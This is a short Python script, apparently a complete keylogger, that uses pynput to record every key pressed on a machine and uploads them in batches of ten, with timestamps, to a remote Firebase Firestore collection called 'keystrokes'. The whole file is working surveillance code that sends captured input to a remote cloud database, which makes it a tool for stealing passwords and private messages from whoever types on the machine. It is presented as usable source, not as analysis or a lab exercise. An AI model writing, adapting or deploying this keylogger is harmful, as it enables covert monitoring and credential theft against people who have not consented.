import firebase_admin
from firebase_admin import credentials, firestore
from pynput import keyboard
import time

# Initialize Firebase connection
cred = credentials.Certificate("")  # Your Firebase JSON key file
firebase_admin.initialize_app(cred)
db = firestore.client()

keystrokes = []

def on_press(key):
    try:
        keystrokes.append(str(key.char))
    except AttributeError:
        if key == keyboard.Key.space:
            keystrokes.append(' ')
        else:
            keystrokes.append(f'[{str(key)}]')

    if len(keystrokes) >= 10:
        log_to_firebase()

def log_to_firebase():
    global keystrokes
    data = ''.join(keystrokes)
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    # Save to Firebase Firestore
    db.collection('keystrokes').add({'timestamp': timestamp, 'data': data})
    print(f"Logged: {data}")
    keystrokes = []

def on_release(key):
    # Exit on pressing 'Esc'
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
